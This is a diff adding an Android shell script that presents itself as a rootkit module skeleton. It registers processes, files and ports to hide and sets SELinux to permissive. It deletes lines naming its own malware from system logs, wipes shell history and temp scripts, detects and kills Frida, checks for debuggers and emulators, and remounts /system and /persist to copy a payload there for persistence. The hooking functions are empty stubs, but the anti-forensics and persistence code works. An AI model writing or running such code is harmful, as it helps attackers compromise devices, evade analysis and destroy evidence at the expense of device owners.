@@ -1,0 +1,532 @@
+# Rootkit module skeleton for process file and port hiding
+
+ZC_ROOT="/data/local/zc"
+ZC_PERSIST="/persist/zc"
+ZC_SYSTEM="/system/etc/zc"
+ZC_LOG="$ZC_ROOT/zc.log"
+ZC_DB="$ZC_ROOT/state.db"
+ZC_RK_DB="$ZC_ROOT/rk_state.db"
+ZC_RK_LOG="$ZC_ROOT/rk.log"
+ZC_HIDE_LIST="$ZC_ROOT/hide.list"
+ZC_VERSION="1.0"
+
+zc_rk_log() {
+  local msg="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
+  echo "[$ts] $msg" >> "$ZC_RK_LOG" 2>/dev/null
+}
+
+zc_rk_init_dirs() {
+  mkdir -p "$ZC_ROOT" 2>/dev/null
+  mkdir -p "$ZC_PERSIST" 2>/dev/null
+  mkdir -p "$ZC_SYSTEM" 2>/dev/null
+  chmod 700 "$ZC_ROOT" 2>/dev/null
+  zc_rk_log "rk dirs initialized"
+}
+
+zc_rk_init_db() {
+  if [ ! -f "$ZC_RK_DB" ]; then
+    echo "CREATE TABLE hidden_procs (pid TEXT PRIMARY KEY, name TEXT, ts TEXT);" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+    echo "CREATE TABLE hidden_files (path TEXT PRIMARY KEY, ts TEXT);" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+    echo "CREATE TABLE hidden_ports (port TEXT PRIMARY KEY, proto TEXT, ts TEXT);" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+    echo "CREATE TABLE rk_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+    zc_rk_log "rk db initialized"
+  fi
+}
+
+zc_rk_state_set() {
+  local key="$1"
+  local value="$2"
+  echo "INSERT OR REPLACE INTO rk_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+}
+
+zc_rk_state_get() {
+  local key="$1"
+  sqlite3 "$ZC_RK_DB" "SELECT value FROM rk_state WHERE key='$key';" 2>/dev/null
+}
+
+zc_rk_add_hidden_proc() {
+  local pid="$1"
+  local name="$2"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "INSERT OR REPLACE INTO hidden_procs (pid, name, ts) VALUES ('$pid', '$name', '$ts');" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+  zc_rk_log "proc hidden: $pid $name"
+}
+
+zc_rk_add_hidden_file() {
+  local path="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "INSERT OR REPLACE INTO hidden_files (path, ts) VALUES ('$path', '$ts');" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+  zc_rk_log "file hidden: $path"
+}
+
+zc_rk_add_hidden_port() {
+  local port="$1"
+  local proto="$2"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "INSERT OR REPLACE INTO hidden_ports (port, proto, ts) VALUES ('$port', '$proto', '$ts');" | sqlite3 "$ZC_RK_DB" 2>/dev/null
+  zc_rk_log "port hidden: $port $proto"
+}
+
+zc_rk_is_hidden_proc() {
+  local pid="$1"
+  local count
+  count=$(sqlite3 "$ZC_RK_DB" "SELECT COUNT(*) FROM hidden_procs WHERE pid='$pid';" 2>/dev/null)
+  if [ "$count" -gt 0 ]; then
+    return 0
+  fi
+  return 1
+}
+
+zc_rk_is_hidden_file() {
+  local path="$1"
+  local count
+  count=$(sqlite3 "$ZC_RK_DB" "SELECT COUNT(*) FROM hidden_files WHERE path='$path';" 2>/dev/null)
+  if [ "$count" -gt 0 ]; then
+    return 0
+  fi
+  return 1
+}
+
+zc_rk_is_hidden_port() {
+  local port="$1"
+  local count
+  count=$(sqlite3 "$ZC_RK_DB" "SELECT COUNT(*) FROM hidden_ports WHERE port='$port';" 2>/dev/null)
+  if [ "$count" -gt 0 ]; then
+    return 0
+  fi
+  return 1
+}
+
+zc_rk_check_root() {
+  if [ "$(id -u)" -ne 0 ]; then
+    zc_rk_log "not root, rk abort"
+    return 1
+  fi
+  return 0
+}
+
+zc_rk_check_selinux() {
+  local mode
+  mode=$(getenforce 2>/dev/null)
+  if [ "$mode" = "Enforcing" ]; then
+    setenforce 0 2>/dev/null
+    zc_rk_log "selinux permissive"
+  fi
+  return 0
+}
+
+zc_rk_list_procs() {
+  if [ -d /proc ]; then
+    local pid
+    for pid in /proc/[0-9]*; do
+      local p
+      p=$(basename "$pid")
+      local name
+      name=$(cat "$pid/comm" 2>/dev/null)
+      if [ -n "$name" ]; then
+        echo "$p $name"
+      fi
+    done
+  fi
+}
+
+zc_rk_hide_proc_by_name() {
+  local target="$1"
+  local line
+  while IFS= read -r line; do
+    local pid
+    local name
+    pid=$(echo "$line" | awk '{print $1}')
+    name=$(echo "$line" | awk '{print $2}')
+    if [ "$name" = "$target" ]; then
+      zc_rk_add_hidden_proc "$pid" "$name"
+    fi
+  done <<EOF
+$(zc_rk_list_procs)
+EOF
+}
+
+zc_rk_hide_proc_by_pid() {
+  local pid="$1"
+  local name
+  name=$(cat "/proc/$pid/comm" 2>/dev/null)
+  if [ -n "$name" ]; then
+    zc_rk_add_hidden_proc "$pid" "$name"
+  fi
+}
+
+zc_rk_hide_file() {
+  local path="$1"
+  if [ -e "$path" ]; then
+    zc_rk_add_hidden_file "$path"
+  fi
+}
+
+zc_rk_hide_port() {
+  local port="$1"
+  local proto="$2"
+  zc_rk_add_hidden_port "$port" "$proto"
+}
+
+zc_rk_list_ports() {
+  if command -v netstat >/dev/null 2>&1; then
+    netstat -tunlp 2>/dev/null
+  elif command -v ss >/dev/null 2>&1; then
+    ss -tunlp 2>/dev/null
+  fi
+}
+
+zc_rk_hide_listening_ports() {
+  local line
+  while IFS= read -r line; do
+    local port
+    port=$(echo "$line" | grep -oE ':[0-9]+' | head -n 1 | tr -d ':')
+    if [ -n "$port" ]; then
+      zc_rk_add_hidden_port "$port" "tcp"
+    fi
+  done <<EOF
+$(zc_rk_list_ports)
+EOF
+}
+
+zc_rk_filter_proc_output() {
+  local input="$1"
+  local line
+  while IFS= read -r line; do
+    local pid
+    pid=$(echo "$line" | awk '{print $1}')
+    if [ -z "$pid" ]; then
+      continue
+    fi
+    if zc_rk_is_hidden_proc "$pid"; then
+      continue
+    fi
+    echo "$line"
+  done <<EOF
+$input
+EOF
+}
+
+zc_rk_filter_file_output() {
+  local input="$1"
+  local line
+  while IFS= read -r line; do
+    if [ -z "$line" ]; then
+      continue
+    fi
+    if zc_rk_is_hidden_file "$line"; then
+      continue
+    fi
+    echo "$line"
+  done <<EOF
+$input
+EOF
+}
+
+zc_rk_filter_port_output() {
+  local input="$1"
+  local line
+  while IFS= read -r line; do
+    local port
+    port=$(echo "$line" | grep -oE ':[0-9]+' | head -n 1 | tr -d ':')
+    if [ -z "$port" ]; then
+      echo "$line"
+      continue
+    fi
+    if zc_rk_is_hidden_port "$port"; then
+      continue
+    fi
+    echo "$line"
+  done <<EOF
+$input
+EOF
+}
+
+zc_rk_filter_logs() {
+  local logfile="$1"
+  local pattern="$2"
+  if [ ! -f "$logfile" ]; then
+    return 1
+  fi
+  local tmp
+  tmp="$ZC_ROOT/tmp_filter.log"
+  grep -v "$pattern" "$logfile" > "$tmp" 2>/dev/null
+  if [ -f "$tmp" ]; then
+    cat "$tmp" > "$logfile" 2>/dev/null
+    rm -f "$tmp"
+  fi
+  zc_rk_log "log filtered: $logfile"
+}
+
+zc_rk_clean_logs() {
+  local logs="/var/log/messages /var/log/syslog /data/anr/traces.txt"
+  local f
+  for f in $logs; do
+    if [ -f "$f" ]; then
+      zc_rk_filter_logs "$f" "ZCwizard"
+      zc_rk_filter_logs "$f" "ZCV8"
+      zc_rk_filter_logs "$f" "CZ3518"
+    fi
+  done
+  zc_rk_log "logs cleaned"
+}
+
+zc_rk_clean_tmp() {
+  rm -f /data/local/tmp/*.sh 2>/dev/null
+  rm -f /data/local/tmp/*.tmp 2>/dev/null
+  rm -f /data/local/tmp/*.log 2>/dev/null
+  zc_rk_log "tmp cleaned"
+}
+
+zc_rk_clean_bash_history() {
+  local hists="/data/local/zc/.bash_history /data/data/.bash_history /root/.bash_history"
+  local h
+  for h in $hists; do
+    if [ -f "$h" ]; then
+      rm -f "$h" 2>/dev/null
+      touch "$h" 2>/dev/null
+    fi
+  done
+  zc_rk_log "bash history cleaned"
+}
+
+zc_rk_check_debugger() {
+  local tracer
+  tracer=$(cat /proc/self/status 2>/dev/null | grep TracerPid | awk '{print $2}')
+  if [ -n "$tracer" ] && [ "$tracer" != "0" ]; then
+    zc_rk_log "debugger detected: $tracer"
+    return 0
+  fi
+  return 1
+}
+
+zc_rk_check_ptrace() {
+  if [ -f /proc/sys/kernel/yama/ptrace_scope ]; then
+    local scope
+    scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
+    echo "$scope"
+  fi
+}
+
+zc_rk_disable_ptrace() {
+  if [ -f /proc/sys/kernel/yama/ptrace_scope ]; then
+    echo 3 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
+    zc_rk_log "ptrace scope set to 3"
+  fi
+}
+
+zc_rk_check_emulator() {
+  local props
+  props=$(getprop 2>/dev/null)
+  if echo "$props" | grep -qE "goldfish|ranchu|genymotion|emulator"; then
+    zc_rk_log "emulator detected"
+    return 0
+  fi
+  return 1
+}
+
+zc_rk_check_frida() {
+  local ports="27042 27043"
+  local p
+  for p in $ports; do
+    if command -v netstat >/dev/null 2>&1; then
+      if netstat -tunlp 2>/dev/null | grep -q ":$p "; then
+        zc_rk_log "frida port detected: $p"
+        return 0
+      fi
+    fi
+  done
+  local frida_files="/data/local/tmp/frida-server /data/local/tmp/re.frida.server"
+  local f
+  for f in $frida_files; do
+    if [ -e "$f" ]; then
+      zc_rk_log "frida file detected: $f"
+      return 0
+    fi
+  done
+  return 1
+}
+
+zc_rk_kill_frida() {
+  local procs
+  procs=$(ps -A 2>/dev/null | grep -i frida | awk '{print $2}')
+  local p
+  for p in $procs; do
+    kill -9 "$p" 2>/dev/null
+    zc_rk_log "frida killed: $p"
+  done
+}
+
+zc_rk_check_magisk() {
+  if [ -d /sbin/.magisk ] || [ -d /data/adb/magisk ]; then
+    zc_rk_log "magisk detected"
+    return 0
+  fi
+  return 1
+}
+
+zc_rk_check_su() {
+  local su_paths="/system/bin/su /system/xbin/su /sbin/su"
+  local s
+  for s in $su_paths; do
+    if [ -e "$s" ]; then
+      zc_rk_log "su detected: $s"
+      return 0
+    fi
+  done
+  return 1
+}
+
+zc_rk_patch_proc() {
+  zc_rk_log "proc patch skeleton"
+  return 0
+}
+
+zc_rk_patch_net() {
+  zc_rk_log "net patch skeleton"
+  return 0
+}
+
+zc_rk_patch_file() {
+  zc_rk_log "file patch skeleton"
+  return 0
+}
+
+zc_rk_install_hooks() {
+  zc_rk_patch_proc
+  zc_rk_patch_net
+  zc_rk_patch_file
+  zc_rk_log "hooks installed skeleton"
+}
+
+zc_rk_remove_hooks() {
+  zc_rk_log "hooks removed skeleton"
+  return 0
+}
+
+zc_rk_persist_system() {
+  local src="$ZC_ROOT/&CZ3518~.tmp"
+  local dst="$ZC_SYSTEM/&CZ3518~.tmp"
+  if [ -f "$src" ]; then
+    mount -o remount,rw /system 2>/dev/null
+    cp "$src" "$dst" 2>/dev/null
+    chmod 644 "$dst" 2>/dev/null
+    mount -o remount,ro /system 2>/dev/null
+    zc_rk_log "persisted to system"
+  fi
+}
+
+zc_rk_persist_persist() {
+  local src="$ZC_ROOT/&CZ3518~.tmp"
+  local dst="$ZC_PERSIST/&CZ3518~.tmp"
+  if [ -f "$src" ]; then
+    mount -o remount,rw /persist 2>/dev/null
+    cp "$src" "$dst" 2>/dev/null
+    chmod 644 "$dst" 2>/dev/null
+    mount -o remount,ro /persist 2>/dev/null
+    zc_rk_log "persisted to persist"
+  fi
+}
+
+zc_rk_persist_all() {
+  zc_rk_persist_system
+  zc_rk_persist_persist
+}
+
+zc_rk_remove_persist() {
+  rm -f "$ZC_SYSTEM/&CZ3518~.tmp" 2>/dev/null
+  rm -f "$ZC_PERSIST/&CZ3518~.tmp" 2>/dev/null
+  zc_rk_log "persist removed"
+}
+
+zc_rk_self_check() {
+  local issues=0
+  if ! zc_rk_check_root; then
+    issues=$((issues + 1))
+  fi
+  if zc_rk_check_debugger; then
+    issues=$((issues + 1))
+  fi
+  if zc_rk_check_frida; then
+    issues=$((issues + 1))
+  fi
+  if zc_rk_check_emulator; then
+    issues=$((issues + 1))
+  fi
+  zc_rk_log "self check issues: $issues"
+  echo "$issues"
+}
+
+zc_rk_status() {
+  echo "ZC rk version: $ZC_VERSION"
+  echo "root: $(id -u)"
+  echo "selinux: $(getenforce 2>/dev/null)"
+  echo "hidden procs: $(sqlite3 "$ZC_RK_DB" "SELECT COUNT(*) FROM hidden_procs;" 2>/dev/null)"
+  echo "hidden files: $(sqlite3 "$ZC_RK_DB" "SELECT COUNT(*) FROM hidden_files;" 2>/dev/null)"
+  echo "hidden ports: $(sqlite3 "$ZC_RK_DB" "SELECT COUNT(*) FROM hidden_ports;" 2>/dev/null)"
+  echo "debugger: $(cat /proc/self/status 2>/dev/null | grep TracerPid | awk '{print $2}')"
+  echo "ptrace scope: $(zc_rk_check_ptrace)"
+  echo "rk db: $ZC_RK_DB"
+  echo "rk log: $ZC_RK_LOG"
+}
+
+zc_rk_main() {
+  zc_rk_log "CZ3518 start"
+  zc_rk_check_root || exit 1
+  zc_rk_check_selinux
+  zc_rk_init_dirs
+  zc_rk_init_db
+  zc_rk_state_set "version" "$ZC_VERSION"
+  zc_rk_disable_ptrace
+  zc_rk_install_hooks
+  zc_rk_persist_all
+  zc_rk_clean_logs
+  zc_rk_clean_tmp
+  zc_rk_clean_bash_history
+  zc_rk_status
+  zc_rk_log "CZ3518 done"
+}
+
+case "$1" in
+  start)
+    zc_rk_main
+    ;;
+  hide-proc)
+    zc_rk_hide_proc_by_name "$2"
+    ;;
+  hide-pid)
+    zc_rk_hide_proc_by_pid "$2"
+    ;;
+  hide-file)
+    zc_rk_hide_file "$2"
+    ;;
+  hide-port)
+    zc_rk_hide_port "$2" "$3"
+    ;;
+  clean)
+    zc_rk_clean_logs
+    zc_rk_clean_tmp
+    zc_rk_clean_bash_history
+    ;;
+  selfcheck)
+    zc_rk_self_check
+    ;;
+  status)
+    zc_rk_status
+    ;;
+  remove)
+    zc_rk_remove_hooks
+    zc_rk_remove_persist
+    ;;
+  *)
+    zc_rk_main
+    ;;
+esac
+
+exit 0
